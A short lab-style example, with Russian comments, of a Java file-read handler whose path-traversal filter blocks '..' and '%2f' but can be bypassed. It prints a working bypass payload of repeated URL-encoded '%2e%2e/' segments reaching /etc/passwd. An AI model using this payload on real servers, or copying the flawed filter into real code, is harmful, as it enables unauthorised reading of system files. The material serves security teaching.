## EXAMPLE:
String fileName = queryParams.get(URL_PARAM_KEY);
        return this.readFile(
                () ->
                        !requestEntity.getUrl().toString().contains("..")
                                && !requestEntity.getUrl().toString().toLowerCase().contains("%2f") //приведение к нижнему регистру
                                && fileName != null,
                fileName);
                
Обход:
1) %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
